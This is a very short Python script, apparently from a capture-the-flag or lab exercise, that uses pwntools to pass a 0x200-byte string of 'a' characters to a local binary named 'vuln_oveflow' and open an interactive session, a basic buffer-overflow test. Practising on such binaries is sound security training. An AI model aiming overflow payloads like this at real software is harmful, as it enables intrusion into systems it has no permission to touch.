from pwn import *
payload = 'a'*0x200
s = process(['./vuln_oveflow',payload])
s.interactive()
